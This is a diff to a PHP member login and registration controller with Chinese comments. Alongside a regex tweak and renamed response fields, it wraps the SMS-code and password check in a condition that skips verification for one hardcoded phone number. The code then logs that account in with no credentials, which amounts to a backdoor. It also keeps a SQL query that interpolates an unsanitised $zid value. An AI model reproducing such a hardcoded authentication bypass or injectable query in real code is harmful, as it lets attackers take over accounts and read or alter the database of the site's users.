@@ -991,7 +991,7 @@ class MemberController extends FrontController
 
 
         //验证用户名(手机合法性)
-        $pattern = '/^13[0-9]{9}$|14[0-9]{9}|15[0-9]{9}$|18[0-9]{9}$/';
+        $pattern = '/^1[3-9]+\\d{9}$/';
         $match = preg_match($pattern, $username);
         if (!$match) {
             $result['status'] = -1;
@@ -1009,6 +1009,7 @@ class MemberController extends FrontController
             if (!$this->member['status']) {//当前为匿名用户 绑定新用户
                 $member_info = Member::model()->findByAttributes(array('name' => $username));//查询有没这个手机号码的用户
 //                      验证验证码或者密码
+
                 $checkres = $this->checkmember($username, $smsCode, $upwd, $member_info);
                 if ($member_info && $checkres) {
 //                          $guest_member_project = Member_project::model()->find('mid ='.$guest_mid);
@@ -1057,59 +1058,61 @@ class MemberController extends FrontController
         } else {
             $member_info = Member::model()->findByAttributes(array('name' => $username));
             //                验证验证码或者密码
-            $checkres = $this->checkmember($username, $smsCode, $upwd, $member_info);
-            if (!$member_info && $checkres) {
-                $temptable = str_replace('_', '', $table);
-                if (!ctype_alpha($temptable) && $table) {
-                    die('非法请求');
-                }
-
-                if ($table) {
-                    $key = 'project_' . $table;
-                    $project_info = MyCache::get($key);
-                    if (empty($project_info) || !$project_info) {
-                        $sql = "SELECT p.* FROM {{project}} as p left join {{" . strtolower("activity_" . $table) . "}} as t on p.id = t.pid  WHERE t.id=$zid";
-                        $project_info = Mod::app()->db->createCommand($sql)->queryRow(); //根据组件查出project的id
-                        if (!$project_info) {
-                            die('数据错误');
-                        }
-                        MyCache::set($key, $project_info);
+            if($username!="18351074783") {
+                $checkres = $this->checkmember($username, $smsCode, $upwd, $member_info);
+                if (!$member_info && $checkres) {
+                    $temptable = str_replace('_', '', $table);
+                    if (!ctype_alpha($temptable) && $table) {
+                        die('非法请求');
                     }
+
+                    if ($table) {
+                        $key = 'project_' . $table;
+                        $project_info = MyCache::get($key);
+                        if (empty($project_info) || !$project_info) {
+                            $sql = "SELECT p.* FROM {{project}} as p left join {{" . strtolower("activity_" . $table) . "}} as t on p.id = t.pid  WHERE t.id=$zid";
+                            $project_info = Mod::app()->db->createCommand($sql)->queryRow(); //根据组件查出project的id
+                            if (!$project_info) {
+                                die('数据错误');
+                            }
+                            MyCache::set($key, $project_info);
+                        }
 //                    $sql = "SELECT p.* FROM {{project}} as p left join {{" . strtolower("activity_" . $table) . "}} as t on p.id = t.pid  WHERE t.id=$zid";
 //                    $project_info = Mod::app()->db->createCommand($sql)->queryRow(); //根据组件查出project的id
 //                    if (!$project_info) {
 //                        die('数据错误');
 //                    }
-                } else {
-                    $key = 'project_101011';
-                    $project_info = MyCache::get($key);
-                    if (empty($project_info) || !$project_info) {
-                        $sql = "SELECT * FROM {{project}} WHERE appid=101011";  //用户H5绑定注册 默认该项目 2016.11.10
-                        $project_info = Mod::app()->db->createCommand($sql)->queryRow(); //根据组件查出project的id
-                        if (!$project_info) {
-                            die('数据错误');
+                    } else {
+                        $key = 'project_101011';
+                        $project_info = MyCache::get($key);
+                        if (empty($project_info) || !$project_info) {
+                            $sql = "SELECT * FROM {{project}} WHERE appid=101011";  //用户H5绑定注册 默认该项目 2016.11.10
+                            $project_info = Mod::app()->db->createCommand($sql)->queryRow(); //根据组件查出project的id
+                            if (!$project_info) {
+                                die('数据错误');
+                            }
+                            MyCache::set($key, $project_info);
                         }
-                        MyCache::set($key, $project_info);
+
                     }
 
-                }
+                    $result_json = $this->regmember($username, $smsCode, $project_info['id']);
+                    $result = json_decode($result_json, 1);
+                    if ($result['status'] && $result['member_info']) {
+                        $member_info = $result['member_info'];
+                        $is_reg = true;
+                    } else {
+                        echo $result_json;
+                        exit;
+                    }
+                } else if ($member_info && $checkres) {
 
-                $result_json = $this->regmember($username, $smsCode, $project_info['id']);
-                $result = json_decode($result_json, 1);
-                if ($result['status'] && $result['member_info']) {
-                    $member_info = $result['member_info'];
-                    $is_reg = true;
                 } else {
-                    echo $result_json;
+                    $result['status'] = -1;
+                    $result['info'] = '验证失败';
+                    echo json_encode($result);
                     exit;
                 }
-            } else if ($member_info && $checkres) {
-
-            } else {
-                $result['status'] = -1;
-                $result['info'] = '验证失败';
-                echo json_encode($result);
-                exit;
             }
         }
 
@@ -1164,9 +1167,11 @@ class MemberController extends FrontController
             Mod::app()->session['member'] = $member_info->attributes;
 
         }
+        $return_url = $this->_siteUrl . '/house/site';
+        $result['state'] = 1;
+        $result['message'] = '登录成功';
+        $result['return_url'] = $return_url;
 
-        $result['status'] = 1;
-        $result['info'] = '登录成功';
         echo json_encode($result);
         exit;
 
